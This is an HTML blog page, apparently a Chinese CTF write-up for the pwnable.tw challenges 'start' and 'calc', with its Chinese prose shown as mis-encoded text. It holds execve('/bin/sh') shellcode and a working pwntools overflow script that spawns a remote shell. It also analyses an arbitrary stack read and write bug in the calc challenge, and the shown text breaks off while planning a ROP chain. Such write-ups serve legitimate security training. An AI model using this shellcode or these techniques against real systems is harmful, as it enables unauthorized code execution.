<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Pwnable.tw (start &amp; calc) | Bin FantasyğŸ¤¯</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="â€‹        æœ€è¿‘è¾¹çœ‹ä¹¦è¾¹åˆ·pwnable.twï¼Œè®°å½•ä¸€ä¸‹write upã€‚">
<meta property="og:type" content="article">
<meta property="og:title" content="Pwnable.tw (start &amp; calc)">
<meta property="og:url" content="http://example.com/2020/07/25/pwnable/index.html">
<meta property="og:site_name" content="Bin FantasyğŸ¤¯">
<meta property="og:description" content="â€‹        æœ€è¿‘è¾¹çœ‹ä¹¦è¾¹åˆ·pwnable.twï¼Œè®°å½•ä¸€ä¸‹write upã€‚">
<meta property="og:locale">
<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724212908.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724213537.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724195515.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724202614.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724202337.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724210855.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724211047.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724211153.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724222247.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724212541.png">
<meta property="article:published_time" content="2020-07-25T00:19:47.000Z">
<meta property="article:modified_time" content="2020-07-24T14:23:43.986Z">
<meta property="article:author" content="Ash3n On3">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724212908.png">
  
    <link rel="alternate" href="/atom.xml" title="Bin FantasyğŸ¤¯" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/plugin/bganimation/bg.css">

  

  <link href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" rel="stylesheet" type="text/css">
<meta name="generator" content="Hexo 5.4.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <div class="outer">
        <div class="widget-wrap mobile-header">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <img class="avatar" src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/avatar/avatar%20(3).jpg">
    <h2 class="author">Ash3n On3</h2>
    <h3 class="description"></h3>
    <div class="count-box">
      <a href="/archives"><div><strong>14</strong><br>æ–‡ç« </div></a>
      <a href="/categories"><div><strong>0</strong><br>åˆ†ç±»</div></a>
      <a href="/tags"><div><strong>0</strong><br>æ ‡ç­¾</div></a>
    </div>
    <ul class="blog-link">
     
          <a href="/" title="Home">
            <li>ä¸»é¡µ</li>
          </a>
        
          <a href="/archives" title="Archives">
            <li>å½’æ¡£</li>
          </a>
        
          <a href="/categories" title="Categories">
            <li>åˆ†ç±»</li>
          </a>
        
          <a href="/tags" title="Tags">
            <li>æ ‡ç­¾</li>
          </a>
        
    </ul>
  </div>
</div>

        <section id="main"><article id="post-pwnable" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/07/25/pwnable/" class="article-date">
  <time class="post-time" datetime="2020-07-25T00:19:47.000Z" itemprop="datePublished">
    <span class="post-month">7æœˆ</span><br/>
    <span class="post-day">25</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      Pwnable.tw (start &amp; calc)
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>â€‹        æœ€è¿‘è¾¹çœ‹ä¹¦è¾¹åˆ·pwnable.twï¼Œè®°å½•ä¸€ä¸‹write upã€‚<span id="more"></span></p>
<h2 id="0x00-start"><a href="#0x00-start" class="headerlink" title="0x00 . start"></a>0x00 . start</h2><h3 id="A-Analysis"><a href="#A-Analysis" class="headerlink" title="A . Analysis"></a>A . Analysis</h3><p>â€‹        ä¹‹å‰çœ‹è¿™ä¸ªé¢˜çš„æ—¶å€™ä¸€è„¸æ‡µé€¼ï¼Œäº‹éš”ç»å¹´æ„Ÿè§‰è²Œä¼¼èƒ½åšã€‚ã€‚ã€‚</p>
<p>â€‹        ç¨‹åºé‡Œåªæœ‰ä¸€ä¸ªæµ“çœ‰å¤§çœ¼çš„startå‡½æ•°ï¼š</p>
<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724212908.png"></p>
<p>â€‹        å…¶å®å·®ä¸å¤šæ˜¯è¿™ä¸¤è¡Œä»£ç ï¼Œä¸€ä¸ªè¾“å‡ºä¸€ä¸ªè¾“å…¥ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">esp = <span class="string">&quot;Let&#x27;s start the CTF:&quot;</span>;</span><br><span class="line">write(<span class="number">1</span>,esp,<span class="number">0x14</span>);</span><br><span class="line">read(<span class="number">0</span>,esp,<span class="number">0x3C</span>);</span><br></pre></td></tr></table></figure>

<p>â€‹        è€Œä¸”æ²¡NXä¿æŠ¤ï¼š</p>
<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724213537.png"></p>
<p>â€‹        é‚£æœæ–­shellcodeå‘—ã€‚è™½ç„¶ä¸çŸ¥é“æ ˆåº•çš„ä½ç½®ï¼Œä½†å¯ä»¥æ‰¾åˆ°startå‡½æ•°ç»“æŸæ—¶æ‰§è¡Œäº†â€add esp,14hâ€çš„æ±‡ç¼–è¯­å¥ï¼Œå¯ä»¥çŒœæµ‹æ ˆçš„å¤§å°ä¸º0x14ï¼Œå› ä¸ºæ ˆé¡¶å°±æ˜¯æˆ‘ä»¬è¾“å…¥å­—ç¬¦ä¸²çš„åœ°æ–¹ï¼Œæ‰€ä»¥paddingçš„å¤§å°ä¹Ÿæ˜¯è¿™ä¹ˆå¤šã€‚</p>
<p>â€‹        ä¸è¿‡ç¬¬ä¸€æ¬¡è¾“å…¥æ—¶ï¼Œè¦å…ˆè¿”å›åˆ°0x08048087è¿™ä¸ªåœ°å€ï¼Œæ­¤æ—¶æ ˆå¸§å·²ç»æ”¶å›ï¼Œå†ä¸€æ¬¡æ‰§è¡Œwrite(1,esp,0x14)ï¼Œå°±èƒ½leakå‡ºæ ˆåº•åœ°å€äº†ã€‚</p>
<p>â€‹        ç¬¬äºŒæ¬¡è¾“å…¥ï¼Œå†å°†è¿”å›åœ°å€æ”¹æˆæ ˆåº•+0x14ï¼Œä¹Ÿå°±æ˜¯shellcodeçš„å¼€å¤´åœ°å€ï¼Œå³å¯æ‰§è¡Œshellcodeã€‚</p>
<p>â€‹        ç„¶åå¼€å§‹å†™shellcodeï¼š</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">xor ecx,ecx;</span><br><span class="line">xor edx,edx;</span><br><span class="line">push ecx;		 <span class="comment">#å­—ç¬¦ä¸²ç»“å°¾	</span></span><br><span class="line">push 0x68732f6e; <span class="comment">#&#x27;n/sh&#x27;</span></span><br><span class="line">push 0x69622f2f; <span class="comment">#&#x27;//bi&#x27;</span></span><br><span class="line">mov ebx,esp;</span><br><span class="line">mov eax,0xb;</span><br><span class="line">int 0x80;</span><br></pre></td></tr></table></figure>

<p>â€‹        ç„¶åpythonè½¬æœºå™¨æ•°ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">&quot;xor ecx,ecx;xor edx,edx;push ecx;push 0x68732f6e;push 0x69622f2f;mov ebx,esp;mov eax,0xb;int 0x80;&quot;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br></pre></td></tr></table></figure>

<p>â€‹        ç„¶åè·‘payloadï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;./start&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">20</span> + p32(<span class="number">0x08048087</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">stack_addr = u32(p.recv(<span class="number">4</span>)) </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Here is addr:&quot;</span>+<span class="built_in">hex</span>(stack_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">asm:</span></span><br><span class="line"><span class="string">xor ecx,ecx;</span></span><br><span class="line"><span class="string">xor edx,edx;</span></span><br><span class="line"><span class="string">push edx;</span></span><br><span class="line"><span class="string">push 0x68732f6e;</span></span><br><span class="line"><span class="string">push 0x69622f2f;</span></span><br><span class="line"><span class="string">mov ebx,esp;</span></span><br><span class="line"><span class="string">mov eax,0xb;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#shellcode=&#x27;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#x27;</span></span><br><span class="line">shellcode = asm(<span class="string">&#x27;xor ecx,ecx;xor edx,edx;push edx;push 0x68732f6e;push 0x69622f2f ;mov ebx,esp;mov eax,0xb;int 0x80&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x14</span> + p32(stack_addr+<span class="number">0x14</span>)+shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="0x01-calc"><a href="#0x01-calc" class="headerlink" title="0x01 . calc"></a>0x01 . calc</h2><h3 id="A-Analysis-1"><a href="#A-Analysis-1" class="headerlink" title="A . Analysis"></a>A . Analysis</h3><p>â€‹        ä¾‹è¡Œå…¬äº‹å¦‚ä¸‹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724195515.png"></p>
<p>â€‹        ä¸»è¦çš„å‡½æ•°æ˜¯calc()ï¼Œåˆ†åˆ«åˆå®ç°äº†get_expr(),init_pool(),parse()ä¸‰ä¸ªå‡½æ•°ã€‚</p>
<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724202614.png"></p>
<p>â€‹        get_expr()æ¥å—ç”¨æˆ·è¾“å…¥è®¡ç®—è¡¨è¾¾å¼ï¼Œå¹¶è¿‡æ»¤æ‰é™¤äº†â€œ+-*ã€%0123456789â€ä¹‹å¤–çš„å­—ç¬¦ï¼Œinit_pool()ç”³è¯·å †å—æ¥å­˜æ”¾æ•°ç»„å¹¶ä¸”åˆå§‹åŒ–ï¼Œç¨‹åºä¸­çš„è‹¥å¹²ä¸ªè¿ç®—æ•°å°±è¢«å­˜æ”¾åœ¨è¿™ä¸ªæ•°ç»„ä¸­ï¼Œparse()è¿›è¡Œè¡¨è¾¾å¼çš„è§£æå¹¶ä¸”è¿ç®—ã€‚</p>
<p>â€‹        ä¸»è¦æ¥çœ‹çœ‹parseå‡½æ•°çš„æ‰§è¡Œæœºåˆ¶ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> __cdecl <span class="title">parse_expr</span><span class="params">(<span class="keyword">int</span> str, _DWORD *num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ST2C_4</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+20h] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+24h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [esp+28h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> *s1; <span class="comment">// [esp+30h] [ebp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+34h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> <span class="keyword">operator</span>[<span class="number">100</span>]; <span class="comment">// [esp+38h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v5 = str;</span><br><span class="line">  j = <span class="number">0</span>;</span><br><span class="line">  bzero(<span class="keyword">operator</span>, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (*(i + str) - <span class="string">&#x27;0&#x27;</span>) &gt; <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = i + str - v5;</span><br><span class="line">      s1 = <span class="built_in">malloc</span>(v2 + <span class="number">1</span>);</span><br><span class="line">      <span class="built_in">memcpy</span>(s1, v5, v2);</span><br><span class="line">      s1[v2] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;0&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;prevent division by zero&quot;</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v9 = atoi(s1);</span><br><span class="line">      <span class="keyword">if</span> ( v9 &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = (*num)++;</span><br><span class="line">        num[v4 + <span class="number">1</span>] = v9;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *(i + str) &amp;&amp; (*(i + <span class="number">1</span> + str) - <span class="string">&#x27;0&#x27;</span>) &gt; <span class="number">9</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;expression error!&quot;</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v5 = i + <span class="number">1</span> + str;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ( <span class="keyword">operator</span>[j] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">switch</span> ( *(i + str) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;%&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">operator</span>[j] != <span class="string">&#x27;+&#x27;</span> &amp;&amp; <span class="keyword">operator</span>[j] != <span class="string">&#x27;-&#x27;</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              eval(num, <span class="keyword">operator</span>[j]);</span><br><span class="line">              <span class="keyword">operator</span>[j] = *(i + str);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">operator</span>[++j] = *(i + str);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            eval(num, <span class="keyword">operator</span>[j]);</span><br><span class="line">            <span class="keyword">operator</span>[j] = *(i + str);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line">            eval(num, <span class="keyword">operator</span>[j--]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">operator</span>[j] = *(i + str);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//Check Point</span></span><br><span class="line">      <span class="keyword">if</span> ( !*(i + str) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( j &gt;= <span class="number">0</span> )</span><br><span class="line">    eval(num, <span class="keyword">operator</span>[j--]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>â€‹        å¤§æ„æ˜¯éå†æ¯ä¸ªå­—ç¬¦ï¼ŒæŠŠæ¯ä¸ªè¿ç®—æ•°ä¿å­˜åœ¨numæ•°ç»„(æ­¤å¤„numçš„ä¼ å‚æ˜¯intå‹ï¼Œå› æ­¤åé¢æ•°ç»„èµ‹å€¼å‡ç”¨æŒ‡é’ˆå¯»å€)ï¼Œè€Œä¸”ä»ä¸‹æ ‡[1]å¼€å§‹ä¿å­˜ï¼Œnum[0]åˆ™ç”¨æ¥å®æ—¶ä¿å­˜æ“ä½œæ•°çš„ä¸ªæ•°ã€‚æ¯ä¸€ä¸ªè¿ç®—ç¬¦è¢«å­˜äºoperatoræ•°ç»„ä¸­ã€‚</p>
<p>â€‹        åœ¨ç…ç…å®é™…ç”¨æ¥è¿›è¡Œè¿ç®—çš„eval()å‡½æ•°ï¼š</p>
<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724202337.png"></p>
<p>â€‹        è¿ç®—æ–¹å¼ä¸º:ç”¨num[0]å½“ä½œä¸‹æ ‡æ‰¾å¯¹åº”çš„è¿ç®—æ•°ï¼Œå†å°†å…¶ä¸å‰é¢çš„è¿ç®—æ•°(å³num[num[0]-1])è¿›è¡Œè®¡ç®—ï¼Œç»“æœè¿”å›åˆ°åè€…ã€‚</p>
<p>â€‹        ä¸¾ä¾‹ï¼šè¾“å…¥1+3æ—¶ï¼Œnum[0] = 2ï¼Œnum[1] = 1ï¼Œnum[2] = 3</p>
<p>â€‹        è¿ç®—ä¹‹åï¼šnum[0] = 1ï¼Œnum[1] = 4ã€‚</p>
<p>â€‹        è€Œä¸”parseå‡½æ•°ä¸­çš„æ£€æŸ¥ç‚¹ä¼šæ£€æŸ¥num[0]æ˜¯å¦ä¸º0ã€‚</p>
<p>â€‹        è€Œè¿™é¢˜çš„<strong>æ¼æ´ç‚¹</strong>åœ¨evalå‡½æ•°é‡Œã€‚å‡½æ•°ä¸­è§„å®šæœ€åä¸€ä¸ªè¿ç®—æ•°ä¸å‰è€…è¿›è¡Œè¿ç®—ï¼Œä½†æ˜¯æ²¡æœ‰è€ƒè™‘è¿‡ç¬¬ä¸€ä¸ªè¿ç®—æ•°ä¸å­˜åœ¨çš„æƒ…å†µã€‚</p>
<p>â€‹        ä¸¾ä¾‹ï¼šè¾“å…¥+300æ—¶ï¼Œnum[0] = 1ï¼Œnum[1] = 300ï¼Œæ‰§è¡Œå¦‚ä¸‹ä»£ç ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> 	num[*num - <span class="number">1</span>] += num[*num];</span><br><span class="line"><span class="comment">//	num[num[0]-1] += num[num[0]]</span></span><br><span class="line"><span class="comment">//	num[1-1] += num[1]</span></span><br><span class="line"><span class="comment">//	num[0] += num[1]</span></span><br></pre></td></tr></table></figure>

<p>â€‹        ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬è¾“å…¥çš„300ï¼Œé‚£ä¹ˆ301ä¼šè¢«å­˜æ”¾åœ¨num[0]ä¸­ï¼Œä½†æ˜¯num[0]è¿ç®—ç»“æŸå-1ï¼Œå› æ­¤ä»ç„¶æ˜¯300ã€‚è€Œåœ¨å‡½æ•°calcä¸­æˆ‘ä»¬çŸ¥é“ï¼Œnum[i-1]ä¼šè¢«ã€‚printfè¾“å‡ºï¼Œè€Œcalcä¸­çš„iç›¸å½“äºparseå’Œevalä¸­çš„num[0]ã€‚æœ€åè¾“å‡ºçš„æ˜¯calcå‡½æ•°ä¸­çš„num[299]ï¼Œç›¸å½“äºè¾“å‡ºäº†parseä¸­çš„num[300]ã€‚æ‰€ä»¥è¯´ï¼Œâ€+xâ€å¥å¼å¯ä»¥è¾¾æˆæ ˆä¸Šçš„ä»»æ„è¯»ã€‚</p>
<p>â€‹        å†ä¸¾ä¾‹ï¼šè¾“å…¥+300+1024æ—¶ï¼Œnum[0] = 2ï¼Œnum[1] = 300ï¼Œnum[2] = 1024ï¼Œä½†æ˜¯ä¸Šé¢æˆ‘ä»¬è¯´è¿‡ï¼Œç¬¬ä¸€æ­¥è¿ç®—ç»“æŸåï¼Œnum[0]ä¸º302ï¼Œè‡ªå‡åä¸º301ï¼Œå› æ­¤ä¹‹åä¼šæ‰§è¡Œå¦‚ä¸‹ä»£ç ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> 	num[*num - <span class="number">1</span>] += num[*num];</span><br><span class="line"><span class="comment">//	num[num[0]-1] += num[num[0]]</span></span><br><span class="line"><span class="comment">//	num[301-1] += num[2]</span></span><br><span class="line"><span class="comment">//	num[300] += num[2]</span></span><br></pre></td></tr></table></figure>

<p>â€‹        æ‰€ä»¥æˆ‘ä»¬åœ¨num[2]ä¸­å†™çš„ä¸œè¥¿ï¼Œéƒ½ä¼šè¢«åŠ åˆ°num[300]é‡Œé¢ã€‚è¿™é‡Œçš„num[1]å’Œnum[2]éƒ½å¯æ§ï¼Œä¹Ÿå°±å®ç°äº†æ ˆä¸Šä»»æ„åœ°å€å†™ã€‚</p>
<h3 id="B-Attack"><a href="#B-Attack" class="headerlink" title="B . Attack"></a>B . Attack</h3><p>â€‹        è™½ç„¶ç¨‹åºåœ¨æ ˆä¸Šå¼€å¯äº†canaryï¼Œä½†æ˜¯ä¸Šè¿°çš„ä»»æ„åœ°å€å†™æ˜¯å®šå‘çš„ï¼Œä¸ä¼šç ´åcanaryã€‚ç¨‹åºè¿˜å¼€å¯äº†æ ˆä¸Šä¸å¯æ‰§è¡Œä¿æŠ¤ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦é€šè¿‡syscallè°ƒç”¨execveã€‚</p>
<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724210855.png"></p>
<p>â€‹        0x5A0Ã·4 = 360ï¼Œæ‰€ä»¥num[0]åˆ°calcå‡½æ•°çš„æ ˆåº•ä¸º360ä¸ªå•ä½ã€‚æ ˆä¸Šç»“æ„å¤§è‡´å¦‚ä¸‹ï¼š</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724211047.png" style="zoom:67%;" />

<p>â€‹        stack of mainä¸Šé¢éƒ½å±äºcalcçš„æ ˆå¸§ã€‚è€Œæˆ‘ä»¬è¦æ”¹å†™çš„ropé“¾å’Œæ ˆç»“æ„å¦‚ä¸‹ï¼š</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724211153.png" style="zoom: 67%;" />

<p>â€‹        å…¶ä»–çš„æ”¹å†™éƒ½æ¯”è¾ƒç®€å•ï¼Œé‡ç‚¹åœ¨äºâ€œ/bin/shâ€å­—ç¬¦ä¸²ï¼Œè¦è®©å‡½æ•°æˆåŠŸè°ƒç”¨ï¼Œå°±ä¸èƒ½è®©ä»–å±äºcalcå‡½æ•°å’Œexecveå‡½æ•°çš„æ ˆå¸§ä¸­ï¼Œä»¥å…è¢«æ¸…ç©ºã€‚æ‰€ä»¥å†™åœ¨äº†int 80åœ°å€çš„åé¢ã€‚</p>
<p>â€‹        é‚£ä¹ˆå¦‚ä½•æ±‚å‡ºè¿™ä¸ªåœ°å€å‘¢ï¼Ÿç”±ä¸Šå›¾æˆ‘ä»¬å¯ä»¥çœ‹å‡ºcalcæ ˆå¸§ä¸­çš„old ebpæˆ‘ä»¬ä¹Ÿå¯ä»¥è¯»å‡ºæ¥ï¼Œå› ä¸ºè°ƒç”¨calcçš„ä¸Šå±‚å‡½æ•°æ˜¯mainï¼Œæ‰€ä»¥è¿™ä¸ªold ebpå°±æ˜¯mainå‡½æ•°çš„ebpã€‚äºæ˜¯æˆ‘ä»¬çŸ¥é“äº†æ ˆåº•ã€‚ä¸è¿‡è¿™ä¸ªebpæŒ‡å‘çš„ç¡®åˆ‡ä½ç½®æˆ‘ä»¬ä¸çŸ¥é“ï¼Œå› æ­¤åªèƒ½å†æ‰¾æ‰¾å…¶ä»–åç§»ã€‚åœ¨mainå‡½æ•°çš„æ±‡ç¼–ä»£ç ä¸­ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥æ±‚å‡ºespçš„å€¼ã€‚</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724222247.png" style="zoom:80%;" />

<p>â€‹        é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è¿›è€Œæ±‚å‡ºmainå‡½æ•°çš„æ ˆå¸§å¤§å°ä¸ºebp-esp+4ï¼Œå› ä¸ºebpå’Œespæ‰€åœ¨çš„å•ä½éƒ½ç®—mainå‡½æ•°çš„æ ˆå¸§ï¼Œå› æ­¤éœ€è¦åŠ 4ã€‚</p>
